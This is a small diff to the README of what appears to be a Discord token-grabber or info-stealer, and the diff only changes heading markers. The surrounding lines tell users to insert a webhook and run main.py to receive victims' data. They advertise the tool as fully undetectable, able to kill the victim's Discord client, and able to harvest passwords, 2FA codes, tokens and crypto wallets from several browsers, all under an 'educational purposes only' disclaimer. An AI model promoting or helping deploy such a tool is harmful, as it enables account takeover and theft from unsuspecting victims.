@@ -16,7 +16,7 @@
 
 ### If you get any errors please DM Ultraviolet#9999 on discord!
 
-### | Setup
+### >> Setup
 
 1. Put your webhook at ``hook = "X"``
 2. Run main.py, you will see your info in the webhook you entered. You need to have python installed to do this, use our built in tool ``Get-Python.bat`` which is located in the **tools** folder to install python!
@@ -27,7 +27,7 @@
 
 ---
 
-### | Features
+### >> Features
 
 > FUD (Fully Undetectable)
 > KILL DC (Kills Victim's Discord Client)
@@ -53,7 +53,7 @@
 - Search User PC for Passwords, 2fa codes, tokens, wallets...
 - Browsers: Opera, Chrome, Brave, Yandex, Edge
 
-### | Important
+### >> Important
 
 I am not responsible for any damages this software may cause. This program was made for educational purposes only.
 
